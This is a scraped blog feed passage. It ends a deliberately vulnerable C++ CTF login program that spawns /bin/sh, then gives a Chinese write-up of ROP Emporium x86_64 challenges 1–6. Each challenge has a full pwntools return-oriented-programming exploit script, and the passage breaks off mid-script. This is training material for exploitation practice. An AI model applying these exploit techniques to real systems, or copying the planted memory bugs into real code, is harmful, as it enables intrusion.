class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">strip_newline</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int64_t</span> length)</span></span>&#123;</span><br><span class="line">    <span class="type">char</span>* i;</span><br><span class="line">    <span class="keyword">for</span>(i = &amp;buf[length]; i &gt;= buf; i--)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( *i == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">            *i = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span> username[<span class="number">0x50</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">0x50</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">User</span>()&#123;&#125;</span><br><span class="line">    <span class="built_in">User</span>(<span class="type">const</span> <span class="type">char</span>* username, <span class="type">const</span> <span class="type">char</span>* password)&#123;</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;username, username, <span class="number">0x50</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;password, password, <span class="number">0x50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">read_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">char</span> name[<span class="number">80</span>];</span><br><span class="line">        <span class="built_in">fgets</span>(name, <span class="number">79</span>, stdin);</span><br><span class="line">        <span class="built_in">strip_newline</span>(name, <span class="number">80</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;username, name, <span class="number">0x50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">read_password</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">char</span> pwd[<span class="number">80</span>];</span><br><span class="line">        <span class="built_in">fgets</span>(pwd, <span class="number">79</span>, stdin);</span><br><span class="line">        <span class="built_in">strip_newline</span>(pwd, <span class="number">80</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(<span class="keyword">this</span>-&gt;password, pwd, <span class="number">0x50</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">char</span>* <span class="title">get_password</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No shell for you!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Admin</span> : User&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Admin</span>(<span class="type">const</span> <span class="type">char</span>* username, <span class="type">const</span> <span class="type">char</span>* password) : <span class="built_in">User</span>(username, password)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">char</span>* <span class="title">get_password</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> User::<span class="built_in">get_password</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">checker</span>&#123;</span><br><span class="line">    <span class="built_in">void</span> (*check)();</span><br><span class="line">    <span class="type">int64_t</span> null[<span class="number">2</span>];</span><br><span class="line">&#125;checker;</span><br><span class="line"></span><br><span class="line"><span class="function">checker* <span class="title">password_checker</span><span class="params">(<span class="type">void</span> (*check)())</span></span>&#123;</span><br><span class="line">    checker checker;</span><br><span class="line">    checker.check = check;</span><br><span class="line">    <span class="keyword">return</span> &amp;checker;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">User login;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> admin_password[<span class="number">88</span>];</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Hello, World!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(admin_password, <span class="string">&quot;2jctf_pa5sw0rd&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;admin_password[<span class="number">15</span>], <span class="number">0</span>, <span class="number">65</span>);</span><br><span class="line">    <span class="function">Admin <span class="title">admin</span><span class="params">((<span class="type">const</span> <span class="type">char</span>*)<span class="string">&quot;admin&quot;</span>, admin_password)</span></span>;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">            <span class="string">&quot; _____   _  ____ _____ _____   _                _       \n&quot;</span></span><br><span class="line">            <span class="string">&quot;|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  \n&quot;</span></span><br><span class="line">            <span class="string">&quot;  / /_  | | |     | | | |_    | |   / _ \\ / _` | | &#x27;_ \\ \n&quot;</span></span><br><span class="line">            <span class="string">&quot; / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |\n&quot;</span></span><br><span class="line">            <span class="string">&quot;/____\\___/ \\____| |_| |_|     |_____\\___/ \\__, |_|_| |_|\n&quot;</span></span><br><span class="line">            <span class="string">&quot;                                          |___/         &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter username: &quot;</span>);</span><br><span class="line">    login.<span class="built_in">read_name</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter password: &quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> greeting_func = []()-&gt;<span class="type">void</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&lt;===Welcome to ZJCTF!!!===&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> login.<span class="built_in">shell</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">    checker* exec = <span class="built_in">password_checker</span>(greeting_func);</span><br><span class="line">    login.<span class="built_in">read_password</span>();</span><br><span class="line">    <span class="type">char</span>* admin_pwd = admin.<span class="built_in">get_password</span>();</span><br><span class="line">    <span class="type">char</span>* user_pwd = login.<span class="built_in">get_password</span>();</span><br><span class="line">    [](checker* exec, <span class="type">char</span>* admin_pwd, <span class="type">char</span>* user_pwd)-&gt;<span class="type">void</span>&#123;</span><br><span class="line">        <span class="type">char</span> s[<span class="number">88</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(admin_pwd, user_pwd))&#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(s, <span class="number">0x50</span>uLL, <span class="string">&quot;Password accepted: %s\n&quot;</span>, s);</span><br><span class="line">            <span class="built_in">puts</span>(s);</span><br><span class="line">            exec-&gt;<span class="built_in">check</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(exec, admin_pwd, user_pwd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/02/28/ROP-Emporium-x86-64-1~6%E9%A2%98/"/>
      <url>/2023/02/28/ROP-Emporium-x86-64-1~6%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>ROP Emporium是一个提供ROP攻击学习样板程序的网站，一共8道题，每道题有64位、32位、ARM、MIPS共4种格式的ELF文件，适用于多种平台，难度依次递增。本文档为前6道题的x86_64位版本的解析。</p><p><a href="https://ropemporium.com/index.html">ROP Emporium</a></p><h1 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1. ret2win"></a>1. ret2win</h1><p>这个没什么好说的，新手第一题水平，直接改返回地址就行。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">40</span>) + p64(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2-split"><a href="#2-split" class="headerlink" title="2. split"></a>2. split</h1><p>这道题需要调用system函数，传入正确的参数。参数在数据段已经给出，直接使用经典gadget将参数pop到rdi寄存器中即可。rdi是64位linux程序函数的第一个参数，前6个参数分别为：rdi, rsi, rdx, rcx, r8, r9，之后的参数在栈中高地址处依次保存。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">useful_string = <span class="number">0x601060</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x4007c3</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">32</span> + <span class="number">8</span>) + p64(pop_rdi_ret_addr) + p64(useful_string) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="3-callme"><a href="#3-callme" class="headerlink" title="3. callme"></a>3. callme</h1><p>这道题需要调用自定义库中的三个函数，这3个函数首先都对传入的前三个参数进行了检查。我们只需要在ROP里面将参数传进去即可。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x4009a3</span></span><br><span class="line">rsirdx = <span class="number">0x40093d</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(rsirdx) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;callme_one&#x27;</span>])</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(rsirdx) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;callme_two&#x27;</span>])</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(rsirdx) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;callme_three&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="4-write4"><a href="#4-write4" class="headerlink" title="4. write4"></a>4. write4</h1><p>这一题虽然有一个print_file函数，但是对应的参数在write4文件中没有给出，需要我们自己构造。仔细使用IDA观察会发现，程序特地给了我们一个gadget实现任意地址写。bss段或data段能够作为我们构造的字符串’flag.txt’的存放位置，那么我们就将这个字符串写到这些可写段中，再将其作为参数传入print_file函数即可。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">useful_gadget = <span class="number">0x400628</span></span><br><span class="line">r14r15 = <span class="number">0x400690</span></span><br><span class="line">rdi = <span class="number">0x400693</span></span><br><span class="line">write_addr = <span class="number">0x601028</span></span><br><span class="line">main_addr = <span class="number">0x400607</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(r14r15) + p64(write_addr) + <span class="string">b&#x27;flag.txt&#x27;</span></span><br><span class="line">payload += p64(useful_gadget)</span><br><span class="line">payload += p64(r14r15) + p64(write_addr + <span class="number">8</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(useful_gadget)</span><br><span class="line">payload += p64(rdi) + p64(write_addr)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5. badchars"></a>5. badchars</h1><p>这道题的pwnme函数中添加了一个检查，不允许出现’x’、’a’、’g’、’.’这4个字符。但是程序中给出了任一地址加减的gadget，我们先写入其他值，然后通过加减将这个值变成我们想要的值就可以了。但是这里需要注意一点：如果在data段的开头——0x601028写入，程序会崩溃。因为我们需要绕过’x’字符，就势必在应该写入x的地方一开始不能写入x。如果在此处写字符串，那么字符’x’的位置应该在0x60102E，但是 <strong>2E正好是’.’的ASCII码，会被强制转换，从而导致ROP失败。</strong> 不过我们还是可以在0x601030写入。</p><p>这里提供一个ROP调试的省时小技巧。当我们构造的ROP多次失败时，如果这个ROP是一次注入，那么我们是无法进行调试的。这种情况下我们可以在ROP中间插入一个有反馈的代码段地址，如main函数开头。我们将这个main函数开头插入到ROP的不同位置，从前往后查找，前面的ROP如果正常执行，那么我们可以及时地得到反馈，如果错误则会崩溃，我们就会知道哪一步ROP之前出了错误。如此从前往后，我们就可以找到，到底是哪一步ROP有问题，从而进行修改。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line"></span><br><span class="line">xor_r14r15 = <span class="number">0x400628</span></span><br><span class="line">add_r14r15 = <span class="number">0x40062c</span></span><br><span class="line">sub_r14r15 = <span class="number">0x400630</span></span><br><span class="line">mov_r12r13 = <span class="number">0x400634</span></span><br><span class="line">pop_r12r13r14r15 = <span class="number">0x40069c</span></span><br><span class="line">pop_r14r15 = <span class="number">0x4006a0</span></span><br><span class="line">pop_rdi = <span class="number">0x4006a3</span></span><br><span class="line">write_addr = <span class="number">0x601030</span></span><br><span class="line"></span><br><span class="line">badchars = <span class="string">&#x27;xga.&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload += p64(pop_r12r13r14r15) + <span class="string">b&#x27;flbh/tyt&#x27;</span> + p64(write_addr) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">2</span>)<span class="comment"># a-&gt;b g-&gt;h .-&gt;/ x-&gt;y then just -1</span></span><br><span class="line">payload += p64(mov_r12r13)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">3</span>)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">4</span>)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">6</span>)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_rdi) + p64(write_addr)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="6-fluff"><a href="#6-fluff" class="headerlink" title="6. fluff"></a>6. fluff</h1><p>这题和上题唯一的区别就是给的gadget不同。但是这个gadget可谓是花里胡哨。3个指令都不熟悉。查！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400628 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400628</span><br><span class="line">.text:0000000000400628 questionableGadgets:</span><br><span class="line">.text:0000000000400628                 xlat</span><br><span class="line">.text:0000000000400629                 retn</span><br><span class="line">.text:000000000040062A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040062A                 pop     rdx</span><br><span class="line">.text:000000000040062B                 pop     rcx</span><br><span class="line">.text:000000000040062C                 add     rcx, 3EF2h</span><br><span class="line">.text:0000000000400633                 bextr   rbx, rcx, rdx</span><br><span class="line">.text:0000000000400638                 retn</span><br><span class="line">.text:0000000000400639 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400639                 stosb</span><br><span class="line">.text:000000000040063A                 retn</span><br><span class="line">.text:000000000040063A ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>xlat指令：将[rbx+al]的值赋值给al，这里的64位解析出来gdb显示为xlatb，赋值后rax高位不变。<br>bextr指令：byte extract。bextr dest src1 src2<br><code>dest = (src1 &gt;&gt; (src2 &amp; 0xFF)) &amp; (1 &lt;&lt; ((src2 &gt;&gt; 8) &amp; 0xFF) - 1)</code><br>即src2的次低字节表示提取bit位数，最低字节表示提取bit位起始处。将src1提取src2中指定的比特位并赋值到dest中。<br>例如本题中的 bextr rbx rcx rdx，设rcx &#x3D; 0b10101100 01011101 00010001 11100111，rdx &#x3D; 0x0509，则提取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 98 76543210</span><br><span class="line">rcx = 0b 10101100 01011101 00010001 11100111</span><br><span class="line"> [   ]</span><br><span class="line">rbx = 0x8</span><br></pre></td></tr></table></figure><p>stosb指令：将al赋值给[rdi]</p><p>通过上述3个指令，我们需要怎样构造flag.txt字符串呢？</p><p>注意到，能够将寄存器的值赋值到内存中的只有stosb指令，在__libc_csu_init函数中有pop rdi; ret的gadget，我们因此可以控制stosb指令将al的值写到哪里。接下来就需要思考如何将正确的值写入al中了。正好xlat指令提供了解决方案，可以将内存中的一个值写入al。但首先，我们需要控制rbx的值，这样才能够在内存中寻找正确的字节。而对于rbx，我们又可以使用bextr指令，控制rcx和rdx后，我们可以在rbx中写入任意值。这样，整个利用的流程也就清晰了。修改rbx -&gt; 修改al -&gt; 修改内存。</p><p>在pwnme函数返回时，rax的值为0xb，是一个较小的值。我们可以在rbx中写入LOAD段中有一块全为0的起始地址，这样就能够将rax赋值为0，便于进行后续操作。</p><p>之后就是一个字符一个字符地转存到.bss段中即可。注意：stosb指令执行后rdi会自增，因此只需要写一个rdi赋值的gadget即可。</p><p>在赋值过程中，我们似乎可以在每赋值一个字节之后就将rax清零，然后精准定位下一个字节。但是构造完毕之后会发现，整个gadget的长度已经超过了写入的限制——0x200。因此我们需要利用上一个字节的值定位下一个字节的值。在一个字节写入完毕后，rax的值应该为这个字节对应的ASCII码，我们需要在rbx中再减去这个ASCII码值，一样可以定位到下一个字节的位置。同时要注意代码中对rcx本身加上了一个值，也要减去。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">xlat = <span class="number">0x400628</span></span><br><span class="line">bextr = <span class="number">0x40062A</span></span><br><span class="line">stosb = <span class="number">0x400639</span></span><br><span class="line">zero_seg = <span class="number">0x600fa0</span><span class="comment"># \x00 in this place</span></span><br><span class="line">write_addr = <span class="number">0x601038</span></span><br><span class="line">rdi = <span class="number">0x4006A3</span></span><br><span class="line">main_addr = <span class="number">0x400607</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># address of char &#x27;f&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;g&#x27;, &#x27;.&#x27;, &#x27;t&#x27;, &#x27;x&#x27;, &#x27;t&#x27;</span></span><br><span class="line"><span class="comment"># you can view the hex in window &#x27;Hex View-1&#x27; in IDA_PRO to find the bytes you want </span></span><br><span class="line">char_addr = [<span class="number">0x4003C4</span>, <span class="number">0x4003C1</span>, <span class="number">0x4003D6</span>, <span class="number">0x4003CF</span>, <span class="number">0x4003C9</span>, <span class="number">0x4003D8</span>, <span class="number">0x400246</span>, <span class="number">0x4003D8</span>]</span><br><span class="line"><span class="comment"># ASCII value of each byte</span></span><br><span class="line">char = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;flag.txt&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(char)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload += p64(rdi) + p64(write_addr)<span class="comment"># make rdi point to address needed to write</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make &#x27;f&#x27; into 0x601038</span></span><br><span class="line"><span class="comment"># gdb tell us that after gadget for rdi, rax should be 0xb, so we minus 0xb to make rax = 0</span></span><br><span class="line">payload += p64(bextr) + p64(<span class="number">0x2000</span>) + p64(zero_seg - <span class="number">0x3EF2</span> - <span class="number">0xb</span>)<span class="comment"># start = 0, len = 0x20, equals mov rbx, rcx</span></span><br><span class="line">payload += p64(xlat)</span><br><span class="line">payload += p64(bextr) + p64(<span class="number">0x2000</span>) + p64(char_addr[<span class="number">0</span>] - <span class="number">0x3EF2</span>)</span><br><span class="line">payload += p64(xlat)</span><br><span class="line">payload += p64(stosb)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">payload += p64(bextr) + p64(<span class="number">0x2000</span>) + p64(char_addr[i + <span class="number">1</span>] - char[i] - <span class="number">0x3EF2</span>)<span class="comment"># to get the right value</span></span><br><span class="line">payload += p64(xlat)</span><br><span class="line">payload += p64(stosb)</span><br><span class="line"></span><br><span class="line">payload += p64(rdi) + p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span 